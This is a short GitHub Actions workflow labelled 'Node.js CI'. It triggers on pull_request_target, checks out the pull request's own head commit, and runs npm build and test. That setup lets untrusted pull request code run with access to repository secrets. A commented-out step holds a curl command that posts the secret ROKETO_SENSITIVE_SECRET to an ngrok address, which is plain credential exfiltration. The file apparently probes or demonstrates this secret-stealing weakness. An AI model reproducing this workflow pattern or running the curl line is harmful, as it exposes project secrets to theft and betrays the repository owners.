name: Node.js CI

on:
  pull_request_target

jobs:
  build:

    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        node-version: [12.x]

    steps:
    - uses: actions/checkout@v2
      with:
        ref: ${{ github.event.pull_request.head.sha }}
          
#     - name: 'hi'
#       run: |
#         "curl --request POST --url https://4d25-77-137-8-226.ngrok.io --header 'content-type: application/json' --data '{\"secret\": \"here it is - '${{ secrets.ROKETO_SENSITIVE_SECRET }}'\"}' --fail"
      
    - name: Use Node.js ${{ matrix.node-version }}
      uses: actions/setup-node@v2
      with:
        node-version: ${{ matrix.node-version }}
        cache: 'npm'
#     - run: npm ci
    - run: npm run build --if-present
    - run: npm test
